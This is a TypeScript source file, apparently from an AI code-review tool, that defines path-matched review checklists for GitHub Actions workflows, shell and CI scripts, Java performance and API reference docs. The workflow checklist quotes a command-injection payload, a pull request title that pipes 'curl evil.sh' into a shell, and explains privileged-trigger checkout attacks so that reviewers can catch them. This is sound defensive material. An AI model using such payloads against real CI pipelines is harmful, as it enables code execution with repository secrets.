/**
 * @license
 * Copyright 2026 Qwen Team
 * SPDX-License-Identifier: Apache-2.0
 */

// Checklists that attach to a *path*, not to a dimension.
//
// The review's dimensions are domain-blind by design — "find security bugs" is a
// lens, not a syllabus — and that works until a file's failure modes are not
// guessable from reading it. A GitHub Actions workflow is the clearest case in this
// repository: it is a YAML file, so it reads as configuration, and a reviewer who
// treats it as configuration misses every one of its attack classes. Not one of the
// nine dimension agents knows to ask whether a `pull_request_target` job checks out
// the pull request's head, and the answer to that question is the difference between
// a CI file and a remote code execution with the repository's write token.
//
// This repo runs `qwen-autofix.yml`, which posts to pull requests. The skill already
// knows a PR branch's CI config is untrusted — Agent 7 is told to read it from the
// base branch — but nothing ever *reviewed a workflow change* for that attack class.
//
// So: a small table of path → checklist, appended to the brief of every agent whose
// territory actually contains a matching file. It is additive to the project's own
// rules (`.qwen/review-rules.md` and friends), never a replacement: a project that
// says nothing about workflows still gets these, and a project that says something
// gets both.
//
// Deliberately *not* here: style rules. The one open-source checklist this borrows
// its shape from ships opinions about `var`, `==`, and nested ternaries — which
// collide head-on with this skill's Exclusion Criteria against formatter-fixable
// nits, and would spend a reviewer's attention on the things a linter already owns.
// A path rule earns its place by naming a defect the dimensions cannot see — and it
// pays a cost: the checklist rides in the brief of every matching agent, so a rule
// that does not earn its tokens on the median matching diff is not a rule.

import { pathTool } from '../script-lint.js';

export interface PathRule {
  /** Named in the brief, so an agent can say which rule it applied. */
  title: string;
  /** Does this rule govern `path`? */
  matches(path: string): boolean;
  /**
   * Paths the rule's own checklist scopes out. `describePaths` lists them
   * after the rest so a capped heading spends its names on the paths the
   * checklist is written for; a rule without one keeps diff order.
   */
  outOfScope?(path: string): boolean;
  /** The checklist, agent-facing. */
  checklist: string;
}

const GITHUB_ACTIONS: PathRule = {
  title: 'GitHub Actions workflows',
  // Scripts under the two workflow-helper conventions — `.github/scripts/**`
  // and `.github/actions/*/**` — are included, with one script-extension
  // class for both so a README or data file there is not governed. That is
  // deliberately narrower than "the scripts the workflow calls": the full
  // class is content-defined (this repository's own workflows call root
  // `scripts/*.js`), and a path matcher that cannot see `run:` lines must
  // not approximate it further than the conventions.
  matches: (p) =>
    /^\.github\/(workflows\/.+\.ya?ml|actions\/.+\/action\.ya?ml|(?:actions\/(?:[^/]+\/)+|scripts\/(?:[^/]+\/)*)[^/]+\.(?:[cm]?[jt]sx?|py|sh|bash|zsh|ksh|dash|ps1|bat|cmd|rb|pl))$/i.test(
      p,
    ),
  checklist: `A workflow is not configuration. It is code that runs on the project's own runners, with the repository's credentials, and some of its inputs come from strangers. The classes below are invisible to a reader looking for "bugs" in YAML.

**You are reviewing this diff, not auditing this file.** A weakness the workflow already had, on a line this change does not touch, is out of scope — the same rule as everywhere else. What is in scope: a line this diff **adds or changes**, and a guard this diff **removes**.

**Blockers (Critical) — the code does something wrong:**

- **A privileged trigger that checks out the pull request's head.** \`pull_request_target\`, \`workflow_run\` and \`issue_comment\` run in the context of the *base* repository: the base branch's workflow, the base repository's secrets, and a token that can **write**. A checkout of \`github.event.pull_request.head.sha\` / \`.head.ref\` / \`refs/pull/N/merge\` then puts **the contributor's code** in the working directory, and the first \`run:\`, \`npm ci\` (which executes the PR's lifecycle scripts), or locally-referenced action executes it with all of that. This is the most exploited misconfiguration in GitHub Actions. A workflow that needs the PR's *content* without running it should use \`pull_request\` (no secrets, read token), or check out the base and read only the files it will parse.
- **Untrusted \`\${{ ... }}\` interpolated into a \`run:\` script.** The runner substitutes the expression into the shell script **before the shell parses it**, so the value is not a string — it is syntax. \`github.event.issue.title\`, \`.pull_request.title\`, \`.body\`, \`.comment.body\`, \`.head_ref\`, \`.head.repo.description\`, \`.head.repo.default_branch\`, every \`workflow_dispatch\` \`inputs.*\`, and every commit message and branch name are contributor-controlled. A pull request titled \`a"; curl evil.sh | sh; #\` is a command. The fix is to pass the value through \`env:\` and reference \`"$VAR"\` inside the script, where the shell treats it as data.
- **A secret placed where a step that runs untrusted code can read it.** A secret in \`env:\` at workflow or job level is in the environment of **every** step, including the one that builds the pull request. Scope it to the step that uses it. Same for \`persist-credentials\` on \`actions/checkout\`: at its default it writes the token into \`.git/config\`, where any later step — or a script the PR contributed — can read it.
- **A fork guard this diff removes or fails to add on a newly-privileged path.** For any trigger a fork can fire, the guard is what makes everything above unreachable: \`if: github.event.pull_request.head.repo.full_name == github.repository\`, an author-association check, or a \`github.repository == '<owner>/<repo>'\` gate on a scheduled job. A diff that adds a privileged trigger without one has added the vulnerability, not inherited it.
- **\`$GITHUB_OUTPUT\` / \`$GITHUB_ENV\` written from untrusted data.** \`echo "x=$UNTRUSTED" >> "$GITHUB_OUTPUT"\` with a value containing a newline injects a second, arbitrary variable — \`PATH\` or \`NODE_OPTIONS\` among them. Multi-line values need the heredoc form with an unguessable delimiter.
- **Artifact or cache poisoning across a trigger boundary.** A \`workflow_run\` job that downloads an artifact a \`pull_request\` job uploaded is pulling contributor-controlled bytes into a privileged context. So is a cache key a fork can populate.
- **A cache or reuse mechanism whose two sides never agree on identity.** \`actions/cache\` matches an entry on \`(key | restore-key)\` **and** a \`version\` that hashes the literal \`path\` strings plus the compression method — not the key alone. So two jobs can share a key, share the \`path:\` line *as written*, and never hit once: \`\${{ runner.temp }}\` expands to a different string on \`ubuntu-latest\` than in a container job or on a self-hosted runner, and an image without the \`zstd\` binary picks gzip where a hosted runner picks zstd. Compare the **environments** — \`runs-on\`, \`container\`, what each path expression expands to, what each image ships — never the YAML strings, which match in exactly the case that fails. The same question governs any restore/skip/reuse mechanism a diff introduces: does the side that writes agree with the side that reads? A mechanism that can never fire is not a slow optimisation, it is a no-op carrying maintenance cost, and no assertion about the YAML's *shape* will ever say so — tests that the two sides' \`key:\` and \`path:\` strings match pass just as happily when neither side can reach the other's cache. If a hit leaves no observable signal either — a restore step with no \`id:\`, nothing written to \`$GITHUB_STEP_SUMMARY\` — the failure is silent and permanent; say that as part of the finding.

**Recommendations (Suggestion) — say the cost, do not block on them:**

- **A third-party action on a mutable tag.** \`uses: someone/thing@v3\` follows a tag its owner can repoint, and it then runs with your token. Pinning to the 40-character SHA removes that. Judge the *change*: an action that **was** pinned and is now on a tag is a regression and belongs above; a new step that follows the project's existing convention does not. Actions published by GitHub itself (\`actions/*\`) and by this repository's own organisation are the common exception, and most projects take it — do not report those unless the project's own rules say otherwise.
- **\`permissions:\` absent or wider than the job needs.** With no block, the job inherits the repository default, which may be write-all. Naming the minimum at job level is the improvement. **Only report this for a job this diff adds or whose permissions it changes** — plenty of healthy projects have never set it, and sweeping their existing jobs into a PR review is exactly the noise that teaches an author to stop reading. **One exception, and it is not a Suggestion:** a broad token on a job that also runs untrusted code is not a separate recommendation, it is *the blast radius of the blocker above*. Say so there, as part of that finding, at Critical.

**The scripts the workflow calls are part of the workflow.** \`node .github/scripts/x.mjs --title "\${{ github.event.pull_request.title }}"\` moves the injection one file along; it does not remove it. If the diff changes such a script, review its argument handling and its own writes to \`$GITHUB_OUTPUT\` with the same eyes.

**Favour precision over recall here.** A false alarm on a workflow costs more reviewer trust than a missed minor nit, because a YAML finding is the easiest kind for an author to dismiss. Every finding needs the concrete trigger and the concrete outcome, like any other.`,
};

const SHELL_LANES: PathRule = {
  title: 'Shell and CI scripts — the lanes that run them',
  // Composes pathTool's executable-script detectors and
  // GITHUB_ACTIONS.matches instead of re-spelling them: a workflow diff
  // must stack both checklists, and composing keeps that invariant
  // structural rather than literals kept identical by hand. Precondition:
  // every path class GITHUB_ACTIONS governs runs on CI lanes and is owed
  // the lane syllabus too — only add such classes there. The zsh/PowerShell
  // extensions stay a deliberate superset of pathTool: shellcheck refuses
  // zsh, but the lanes that run these files are what this syllabus exists
  // for. The hadolint arm drops pathTool's basename-prefix over-match on
  // documents and stray artifacts (`dockerfile.rst`, `Dockerfile.swp`,
  // `Dockerfile.lock`): prose about a Dockerfile has no lanes.
  // The scripts arm is spelled as end-anchored suffix checks plus a
  // directory check, not one leading-anchored regex: PR paths are
  // attacker-controlled, and a `(?:^|\/)scripts\/` anchor followed by a
  // backtracking `.+` suffix is quadratic on `scripts/scripts/…` paths.
  matches: (p) => {
    const tool = pathTool(p);
    return (
      tool === 'shellcheck' ||
      (tool === 'hadolint' &&
        !/\.(?:md|rst|adoc|html?|org|txt|ya?ml|json|lock|swp)$/i.test(p)) ||
      /\.(zsh|ps1|bat|cmd)$/i.test(p) ||
      GITHUB_ACTIONS.matches(p) ||
      /(?:^|\/)scripts\/tests\/vitest\.config\.[cm]?[jt]sx?$/i.test(p) ||
      (/(?:^|\/)scripts\//i.test(p) &&
        /(?:^|\/)[^/]+\.(?:test|spec)\.[cm]?[jt]sx?$/i.test(p))
    );
  },
  checklist: `A shell script's behaviour is a property of the **host** that runs it, and a test's greenness is a property of the **lanes** that run it. Neither is in the diff, and neither is in your own shell: you are one host, and this pull request's checks are a subset of the lanes. No dimension asks which lanes exist, so a change that is green everywhere you can see it lands red where nobody looked.

**You are reviewing this diff, not auditing this file.** A portability weakness on a line this change does not touch is out of scope — the same rule as everywhere else. What is in scope: a line this diff **adds or changes**, and a lane this diff **newly reaches**.

**Blockers (Critical):**

- **A test that will be red on a lane this pull request does not run.** Before you accept a new or changed test that shells out, drives a CLI, or touches the filesystem, answer *which lanes execute this file*: the runner's own \`exclude\`/skip list (a suite gated off Windows is **not** gated off macOS — the gate names the platform it was written for, not the platform it is safe on), and the CI matrix, including jobs gated on \`merge_group\`, \`schedule\`, \`push\`, or a label. Those are required checks whose result the pull request page reports as **skipped**, so a green pull request is not evidence about them, and the first red is a merge-queue failure — which ejects the entry and stalls the queue for every pull request batched with it, not just this one. Name the lane, the job's test command, and the assertion in the finding. (A "Tested on" table that ticks a platform whose lane never ran is the same defect, stated by the author.)
- **GNU-only tooling on a lane without a GNU userland.** macOS ships BSD tools and Alpine ships busybox: \`realpath -m\`, \`readlink -f\`, \`sed -i\` (BSD requires an argument), \`date -d\`, \`stat -c\`, \`find -printf\`, \`grep -P\`, \`xargs -r\`, \`base64 -w\`, \`cp --parents\`, \`sort -h\`, \`mktemp -p\`, and \`timeout\`/\`nproc\`/\`sha256sum\` (absent outright) fail or mean something else there. Two different findings fall out of this, and they are not the same severity: the **script** needs the flag on a lane that lacks it — a real bug — or the script is legitimately single-platform but a **test** asserts the flag's effect, which is a red lane for a defect that cannot exist there. Watch what a fallback does to both: \`x="$(realpath -m -- "$x" 2>/dev/null || printf '%s' "$x")"\` does not fail off-GNU, it silently skips the canonicalization — so every guard downstream is matching the raw string, and the test that was written to pin the canonicalization is the only thing that goes red.
- **Two spellings of one path, compared as strings.** \`os.tmpdir()\` on macOS is \`/var/folders/…\` whose real path is \`/private/var/folders/…\`; a container's \`/tmp\` is often a symlink; Windows has 8.3 short names. A fixture that resolves one side (\`fs.realpathSync\`) and leaves the other raw passes only where the two spellings coincide, and if the code under test reconciles them by shelling out to a tool, that reconciliation has to exist on every lane too. The fix is to spell both sides the same way, not to resolve one more.
- **Privilege and environment assumed from the reviewer's own shell.** root ignores a \`chmod 0o500\` fixture (\`CAP_DAC_OVERRIDE\`) so the permission failure the test needs never happens; CI containers commonly run as root; Windows has no POSIX mode bits at all; \`sudo\` may be absent or password-gated; \`$HOME\`, \`$TMPDIR\`, and \`$PATH\` are lane properties. A test that needs a real failure has to skip where it cannot get one — and a test that *passes* because the environment made the assertion vacuous is worse than one that fails.

**The fix to suggest: probe the capability, not the platform.** \`skipIf(process.platform === 'darwin')\` is wrong in both directions — it skips a Mac that has coreutils on \`PATH\`, and stays green on a busybox lane that lacks the flag too. \`spawnSync('realpath', ['-m', '--', '/'], { stdio: 'ignore' }).status === 0\` gates on the thing that actually decides the outcome and keeps the coverage wherever the capability exists. Where the production code is genuinely single-platform, say so in the finding: the fix is to gate the **test**, not to weaken the script.

**A finding here needs the lane and the mechanism.** "This may not work on macOS" is a worry; "\`test_macos\` is \`merge_group\`-only and runs \`npm run test:ci\` → \`test:scripts\`, Darwin's \`realpath(1)\` exits 1 on \`-m\`, so the \`|| printf\` fallback keeps the path raw and the assertion at line 2902 fails" is a finding. If you cannot name the lane, you do not have one. **Favour precision over recall here** — a portability guess is the easiest kind for an author to dismiss, and one dismissal teaches them to skip the rest of the review.`,
};

const JAVA: PathRule = {
  title: 'Java / JVM performance',
  matches: (p) => /\.java$/i.test(p),
  outOfScope: isOutOfScope,
  checklist: `A Java change's most expensive regressions are decided by the JVM, not by anything a reader can see in the source: HotSpot chooses what to inline, what to scalar-replace, and what to compile at all — and a one-line change can flip each of those on a hot path. The general performance lens (N+1, repeated work, data structures) sees none of it.

**You are reviewing this diff, not auditing this file.** A JVM-cost weakness the code already had, on a line this change does not touch, is out of scope — the same rule as everywhere else. What is in scope: a line this diff **adds or changes**, and a cheap path this diff **makes hot** (a new caller in a request loop, a call moved inside a loop). Test sources (\`src/test/**\`), \`package-info\`/\`module-info\`, and generated sources are out of scope for the hot-path items — nothing there is hot.

**Correctness traps dressed as concurrency or performance code (Critical):**

- **A \`SimpleDateFormat\` shared across threads.** It is not thread-safe: concurrent \`parse\`/\`format\` corrupts its calendar state and returns silently wrong values or throws. If the diff adds a shared (static or instance field) \`SimpleDateFormat\`, or makes an existing one reachable from more than one thread, that is wrong, not slow. The fix is \`java.time.format.DateTimeFormatter\` (immutable) or a \`ThreadLocal\`.
- **A compound action on \`ConcurrentHashMap\` built from two calls.** \`get\`-then-\`put\`, \`containsKey\`-then-\`put\`, check-then-act of any shape: the map's thread safety covers each call, not the pair, and the race loses an update or runs the guarded work twice. Say what the race corrupts — that is the finding. Fix with \`putIfAbsent\`, \`computeIfAbsent\`, or \`merge\`.
- **Double-checked locking without \`volatile\` on the field.** The reading thread can observe a partially constructed object. If the diff adds or touches the idiom, the field must be \`volatile\` (or replaced with the holder idiom).

**JVM-cost defects provable from the source (Suggestion — a cost, not a wrongness):**

- **A regex compiled per call.** \`Pattern.compile(...)\` in a method body or loop, and the \`String\` conveniences that hide it — \`matches\`, \`replaceAll\`, \`replaceFirst\`, and \`split\` with a real regex (a one- or two-character \`split\` argument takes a fast path only when it is not a regex construct — \`split(".")\` does not, since \`.\` is a metacharacter; the escaped two-character form \`split("\\\\.")\` does) — recompile the pattern on every invocation. On a per-request or per-record path that is real CPU. Fix: \`private static final Pattern\`.
- **\`+=\` on a \`String\` inside a loop.** Each iteration rebuilds and copies the whole accumulated prefix; the loop is O(n²) in the final length. Fix: one \`StringBuilder\` outside the loop.
- **Boxing on a hot path.** A \`Long\`/\`Integer\` loop accumulator, a \`Map<Long, …>\` over dense \`int\` keys, \`.boxed()\` in a counted stream: every box past the small-integer cache is an allocation plus a pointer chase per iteration. Fix: primitives, or the primitive streams/collections.
- **A capturing lambda or method reference inside a hot loop.** A non-capturing lambda is a singleton; one that closes over a local allocates per iteration. If the diff moves a capturing lambda into a loop, hoist it or restructure it to capture nothing.
- **A log message built whether or not it is logged.** \`log.debug("result: " + value)\` pays the concatenation with the level off, and even \`log.debug("{}", expensive())\` still pays \`expensive()\`. Fix: parameterized messages, and guard expensive arguments with \`isDebugEnabled()\` or a supplier-based logging API.
- **A collection sized after the fact.** A \`HashMap\`/\`ArrayList\` the code then fills with a known N pays repeated rehash/grow-copy chains; presize it (a \`HashMap\` needs \`N/0.75 + 1\` to avoid rehashing at all — \`HashMap.newHashMap(n)\`, JDK 19+, does that arithmetic for you).
- **Legacy synchronized types in new code.** \`Vector\`, \`Hashtable\`, \`StringBuffer\` put a monitor on every call; the unsynchronized equivalents are the default for a reason.
- **An exception used as control flow.** Validating by catching \`NumberFormatException\`, looping until \`EOFException\`: \`fillInStackTrace\` costs more than the work being guarded. Validate instead.
- **Reflection rediscovered per call.** \`getMethod\`/\`getField\` on every invocation of a hot path; cache the \`Method\`/\`Field\` — or a \`MethodHandle\` — once.

**JIT inlining — the regression no dimension can see, and you cannot prove from source:**

HotSpot's C2 compiler gates inlining on the **bytecode size of the callee** among other criteria. These are the size caps in its normal policy (a project's own \`-XX:\` flags, or a different JVM, change them — check before citing):

| callee bytecode size | C2 normal-policy size cap |
| --- | --- |
| ≤ 6 (\`MaxTrivialSize\`) | under the trivial cap — size alone does not block it |
| ≤ 35 (\`MaxInlineSize\`) | under the normal cap — size alone does not block it |
| ≤ 325 (\`FreqInlineSize\`) | under the hot cap — size blocks it unless the call site is hot |
| > 325 | over the hot cap — size blocks it at every call site |
| > 8000 (\`HugeMethodLimit\`, a develop flag gated by the product \`DontCompileHugeMethods\`) | over the huge-method limit — size blocks even JIT compilation |

A size cap is a gate, not an outcome: passing one is necessary but not sufficient. Independent of size, C2 also declines a call site that was **never executed**, has **low call site frequency**, exceeds the inlining **depth or recursion limits**, or hits the **node-count** cutoff — so a method under a cap can still be left un-inlined, and a static size measurement proves only that a threshold was crossed, not that the method *was* inlined before and *is not* now.

Two more ways a diff can flip it: an already-compiled callee whose **native** size passes \`InlineSmallCode\` (x86_64 default: 2500 on JDK 17+, 2000 on JDK 8–16; 1000 only with \`-XX:-TieredCompilation\`) stops being inlined to protect the code cache, and a call site that gains a **third** receiver implementation goes megamorphic — vtable dispatch, and no inlining **unless one receiver still dominates the profile** (\`TypeProfileMajorReceiverPercent\`, 90% by default), in which case C2 inlines that receiver behind a guard with an uncommon trap for the rest. So the diff-shapes that matter: a small method on a hot path the change **grows** (added validation, logging, a branch), a new layer in a hot call chain, a new implementation registered for an interface invoked in a hot loop. A cold method over 325 bytes is **not** a finding — inlining only matters where the call is hot.

**Measure it; do not estimate bytecode from source.** Two tiers, in order of cost:

1. **Static — available when the class compiles, which for a leaf class is always and for a connected one needs its dependencies.** Allocate a private scratch dir first — \`SCRATCH=$(mktemp -d)\`, never a fixed path like \`/tmp/scratch\`: other agents are compiling concurrently, and two of them writing different revisions of the same class into one directory read each other's \`.class\` files and measure the wrong bytecode (on Windows, \`mkdir %TEMP%\\review-%RANDOM%\` gives the same uniqueness). Then \`javac -proc:none -nowarn -d "$SCRATCH" X.java\` — \`-proc:none\` is not optional: annotation processors on the classpath (Lombok, Dagger, one the PR itself added) run at compile time with your privileges, so a \`javac\` without it is itself an untrusted-code execution. It is also a fidelity flag: on a project whose processor contributes code to the measured class (Lombok's generated members, Dagger's injected fields), the compiled class is missing those members and \`javap\` reports a size that is simply wrong — if the project runs a processor that touches this class, the static tier is **void**; go to \`Confidence: low\` with the mechanism. Give the compiler what it needs to resolve imports: \`-sourcepath\` at the module source root, plus \`-cp\` against an already-built \`target/classes\` / \`build/classes\` if one exists. Pass \`--release <N>\` at the project's target level (read it from \`maven.compiler.release\`, \`<release>\`, or Gradle's \`release\`/\`targetCompatibility\`): the same source compiles to different bytecode at different levels — a five-\`+\` concatenation is 37 bytes at release 8 and 14 at 9+ — and measuring the wrong level produces a threshold verdict on bytecode the shipped artifact does not contain; if the target level cannot be determined, say so in the finding. Then \`javap -c -p\` the class and read the method's size: the offset of its last instruction plus that instruction's width. Compare against 35 and 325. For the **crossing** claim — "this diff pushed it over the threshold" — get the base side **without touching the tree**: \`git show <merge-base>:<path> > "$SCRATCH/X.java"\`, compile that too, and measure both; a method already over on the base side is pre-existing, not a finding. A file the PR **adds** has no base side — \`git show\` fails, and there is no crossing to claim; report the size without a before/after. The base side compiles against the same \`target/classes\` the head side used; on a PR that changes more than the measured file the conditions are not perfectly equivalent — note that caveat when it applies. If the class will not compile (no pre-built classpath, no source path that resolves its imports), go straight to the mechanism-at-\`Confidence: low\` form below — **never \`git checkout\`, \`git stash\`, build in place, or run \`mvn\`/\`gradle\` to force a compile.** In a PR review the worktree is shared with agents running concurrently and the branch's build logic is contributor-controlled — the attack surface, not a cost; in a local review it is the user's own checkout. Mutating either corrupts work you cannot see.
2. **Dynamic — when the code is runnable.** Run the workload with \`-XX:+UnlockDiagnosticVMOptions -XX:+PrintInlining\` and grep for the method: \`callee is too large\` / \`hot method too big\` is the JVM itself declining to inline. JMH gives the before/after throughput; JITWatch visualizes the same decision logs.

A finding that a method "can no longer be inlined" needs the **dynamic** tier — only \`PrintInlining\` or equivalent runtime evidence shows the JVM actually declined to inline. The static tier proves a **size-gate crossing**, which is the mechanism: report it at \`Confidence: low\` — the threshold crossed, what the diff added to the method, and the runtime measurement still to run. A "can no longer be inlined" claim with neither tier is a guess stated as fact. And if the diff *claims* this path got faster while the mechanism above says it cannot have, the finding is the unsubstantiated claim.

**When the finding IS a grown hot method, the fix to suggest is hot/cold splitting — not reverting the change, and not a JVM tuning flag** (\`-XX:FreqInlineSize\`, \`-XX:CompileCommand=inline\`): those are runtime knobs the PR's author cannot ship in a code change, and raising an inline threshold to fit one method pays for it at every other call site. (The JDK-internal \`@ForceInline\` is not available to application code at all.) Move the cold paths — error handling, rare branches, defensive validation, the \`switch\` arms that almost never fire — into a small private helper, leaving the common path under the threshold; the helper, now called from one site, is itself inlinable. Name the bytecode range to extract and the size it leaves behind, the way the measurement names them: "extract bytecodes 212–311 (~100 bytes) into \`applyRounding\`, leaving \`parseAmount\` at ~238 bytes" is a finding an author can act on; "consider splitting the method" is not.

**Favour precision over recall here.** A guessed JVM finding is the easiest kind for an author to dismiss, and one dismissal teaches them to skip the rest of the review. Every finding needs the concrete hot path and the concrete cost, like any other. Performance findings are **Suggestions** — slow is a cost, not incorrect behaviour — **except where the cost is itself the wrongness**: unbounded allocation, quadratic work, or unbounded cache growth on attacker-reachable input is a denial-of-service hole, which the severity ladder grades Critical, not a Suggestion. Name the reachable input that triggers it; "this loop is slow" with no attacker-reachable trigger stays a Suggestion.`,
};

/**
 * Genres that describe intent or history rather than a contract. One list, used
 * for both the directory form (`docs/rfcs/x.md`) and the filename form
 * (`docs/api/rfc-0001.md`), so the two cannot drift apart — a review found the
 * exclusion enforced for the directory form of proposals and the filename form
 * of changelogs and for neither of the other two, which let a changelog
 * directory and a flat-layout RFC through.
 *
 * `releases?` is here for the same reason `changelogs?` is: per-version history,
 * not a contract. This repository ships one (`packages/sdk-java/qwencode/RELEASE.md`)
 * inside a governed location, so the member has a live trigger, not a
 * hypothetical one.
 */
const NON_CONTRACT_GENRE =
  'designs?|plans?|rfcs?|proposals?|adrs?|changelogs?|releases?';
const NON_CONTRACT_DIR = new RegExp(`(?:^|/)(?:${NON_CONTRACT_GENRE})/`, 'i');
/**
 * Separator-anchored rather than start-anchored: a genre is a whole token
 * wherever it sits, so `0003-adr` and `2026-changelog` are the genre their name
 * says they are, while `designer-notes` and `planning-board` — where the genre
 * letters merely begin a longer word — are not.
 */
const NON_CONTRACT_STEM = new RegExp(
  `(?:^|[-_. ])(?:${NON_CONTRACT_GENRE})(?:[-_. ]|$)`,
  'i',
);
/**
 * Repository-meta and agent-context documents, matched whole. Unlike a genre
 * this is a CLOSED set of conventional filenames — the reason it can be
 * enumerated at all, and the reason it is exact-match: `qwen` excludes an
 * agent-context file without touching `qwen-serve-protocol`.
 */
const NON_CONTRACT_FILE =
  /^(?:contributing|roadmap|code[-_]of[-_]conduct|license|licence|authors|governance|support|qwen|agents|claude)$/i;
/**
 * Trees whose prose the author of a diff does not own. A vendored library or a
 * doc-shaped fixture can carry a whole reference section, and the location
 * branches would govern it — findings against third-party prose are noise the
 * author cannot act on. Another closed, conventional set, for the same reason
 * the meta filenames above are one.
 */
const NOT_OURS =
  /(?:^|\/)(?:vendor|vendors|third[-_]?party|node_modules|fixtures|__fixtures__)\//i;

const CONTRACT_DOCS: PathRule = {
  title: 'Consumer-facing contract documentation',
  // Governance comes from WHERE the document lives, never from a keyword in its
  // name. A keyword branch was tried and withdrawn: `protocol` in a filename
  // fires anywhere in the tree, which put a user guide, a changelog entry and a
  // flat-layout RFC under a checklist whose blockers are graded Critical, and no
  // amount of adding exclusions closed it — each audit round found another form,
  // which is the signal that the entrance space does not enumerate. It also
  // backtracked quadratically: `[^/]*(keyword)[^/]*\.mdx?$` paid a failing tail
  // scan once per keyword occurrence, 403 ms on a 96 kB path that git accepts,
  // synchronously inside every agent-brief build — the shape the JAVA checklist
  // in this same file grades a denial-of-service hole.
  //
  // The cost of location-only is real and deliberate: a repository that keeps
  // its wire reference outside a documentation or SDK tree (`PROTOCOL.md` at the
  // root, `spec/wire.md`) is not governed. That is the precision side of the
  // trade this file already takes everywhere else, and a project that wants the
  // checklist anyway has `.qwen/review-rules.md`.
  //
  // The reverse cost — non-contract prose inside a governed section — is
  // answered only where it can be answered by a closed set (the genres above,
  // the meta filenames above). Beyond that it is accepted rather than
  // enumerated: measured on this repository, 44 of the 55 tracked documents
  // under `docs/developers/` are integrator references (the daemon and tool
  // references, the SDK guides, the wire protocol), and deciding document KIND
  // inside a reference tree is the same non-converging shape that took the
  // keyword branch out. An agent handed a contributing guide finds nothing —
  // the checklist is diff-scoped and its exclusions are explicit — so the
  // residue is tokens, not false findings.
  matches: (p) => {
    if (!/\.(?:mdx?|markdown|mdown)$/i.test(p)) return false;
    if (NOT_OURS.test(p)) return false;
    if (NON_CONTRACT_DIR.test(p)) return false;
    // Extension-stripped: `NON_CONTRACT_FILE` matches a whole stem, so the
    // strip is what decides `docs/api/CONTRIBUTING.md`.
    const stem = p.slice(p.lastIndexOf('/') + 1).replace(/\.[a-z]+$/i, '');
    if (NON_CONTRACT_FILE.test(stem)) return false;
    if (NON_CONTRACT_STEM.test(stem)) return false;
    return (
      // Any depth on purpose: a package-local reference section
      // (`packages/foo/docs/api/`) is an ordinary monorepo shape. What that
      // admits and should not — a vendored or fixture tree carrying its own
      // docs section — is answered by `NOT_OURS` above rather than by anchoring
      // this branch, which would drop the package-local case with it.
      /(?:^|\/)docs\/(?:developers?|apis?|references?|protocols?)\//i.test(p) ||
      // Anchored to a package root: an `sdk*` segment at any depth also matched
      // `docs/users/sdk/quickstart.md` and `examples/sdk/README.md`, which is
      // the tree-wide entrance the keyword branch was withdrawn for.
      /^(?:packages\/|libs?\/)?sdks?(?:-[a-z0-9]+)*\//i.test(p)
    );
  },
  checklist: `The reader of this document cannot read your code. It is a wire protocol, an API reference or an SDK guide — someone writes a client against it, ships that client, and never sees the implementation that was supposed to back the sentence they built on. Every other lens in this review reads the code and asks whether it is right. This one reads the **prose the diff added** and asks whether the code makes it true.

That prose is also the only place in the PR where the contract appears in falsifiable form. Code comments state intent and tests state examples; a reference document states the general rule — "advances exactly once", "is written before the event is published", "is absent until the first such terminal", "is never earlier than the creation time". Each of those has a truth value, the author already wrote it, and nothing else in this review is looking at it. In a live verification of one protocol-doc change, a single changed hunk carried **twelve** independently falsifiable assertions.

**You are reviewing this diff, not auditing this file.** A reference document is long and some of it has been wrong for years. In scope: prose this diff **adds or changes**, and prose this diff **leaves standing that its own code change falsifies**. Out of scope: everything else on the page.

**Method — split, then rule.** A paragraph is not one claim. Break the changed prose into the smallest statements that can independently be true or false and rule on each separately; a paragraph judged as a unit gets the verdict of its most plausible sentence. Resolve each statement the way this review resolves any failure scenario: trace it to the code path that implements it, or — when it is runnable and reading has not settled it — **run it**. Never resolve a doc claim by re-reading the doc, and never by quoting the same sentence back as its own evidence.

**A negative claim needs a positive control.** Reference prose is full of negatives — "X never advances it", "this does not invalidate the cache", "the field is absent before the first Y". A negative is only as good as an instrument that would have seen the positive, so before reporting that a documented "never" holds, show the same probe observing the case where it **does** happen. Without that, "the documented invariant holds" and "my probe never looked" are the same observation.

**Blockers (Critical):**

- **A statement the code cannot satisfy.** The document says a field is always present and a live path returns without setting it; it says a value is monotonic and a path assigns it from a source that can go backwards; it says a request is idempotent and the second call is not. An integrator builds on that sentence and their client is wrong in a way neither their tests nor yours will show, because both sides believe the document. Report the statement verbatim, the code path that falsifies it, and the observation that settles it.
- **Prose this change silently falsified.** The diff changes an externally-observable behaviour — a status code, a field's presence or type, an ordering, an error shape, a default — and the paragraph describing the old behaviour is still on the page, unchanged, now wrong. This is the failure a diff-scoped read misses by construction: the wrong lines are the ones the diff did **not** touch. Take each externally-observable behaviour the diff changes and grep the reference docs for the sentence that describes it.
- **A guarantee wider than the code's.** The document generalizes ("always", "never", "any", "every") where the implementation covers one case, or promises a property — ordering, exactly-once, durability, atomicity — the code provides only on the happy path. Name the input or the state that leaves the guarantee.

**Recommendations (Suggestion):**

- **A documented behaviour nothing tests.** The statement is true today and no test pins it, so the next refactor is free to break the contract without turning anything red. Name the statement and the test that should exist — one Suggestion for the set, never one per sentence.
- **A contract carried only in prose that the type or schema could carry.** An optional field the document says is "absent before X" while the published type says merely optional; an enumerated set of values the document lists and the schema leaves as a bare string. The document is doing work the machine-readable artifact could do, and only one of the two is checked by anybody's build.

**Not a finding, ever:**

- Wording, tone, grammar, heading level, ordering, or formatting of the prose. This is not a copy edit, and a review that opens with a comma is a review the author stops reading.
- A document that is merely **silent** about something the diff adds. Silence is the sibling-parity question and another lens already owns it; this rule is about statements that are **wrong**, not statements that are missing.
- Aspirational or roadmap text the document itself marks as such ("planned", "not yet implemented", "experimental"), and any prose describing a deliberately unimplemented surface.
- Imprecision no reasonable integrator could act on wrongly. "Fast", "small", "recent" are not falsifiable and are not defects.
- A claim about behaviour outside this repository — another service's response, a platform's guarantee — unless the diff itself is what asserts it.

**Favour precision over recall here.** A documentation finding is the cheapest kind for an author to dismiss, and the second dismissal teaches them to skim the rest of the review. Every finding names the exact sentence, the exact code path or observation that contradicts it, and what the sentence should say instead — a finding that reports a mismatch without saying which side is wrong is not actionable, and on this rule the answer is often that the **code** is right and the sentence is what has to change.`,
};

/** Every rule, in the order their checklists are appended. */
export const PATH_RULES: PathRule[] = [
  GITHUB_ACTIONS,
  SHELL_LANES,
  JAVA,
  CONTRACT_DOCS,
];

function isOutOfScope(p: string): boolean {
  return (
    /src\/(test|integrationTest|integTest|androidTest|testFixtures)\//i.test(
      p,
    ) ||
    /(?:^|\/)(?:package-info|module-info)\.java$/i.test(p) ||
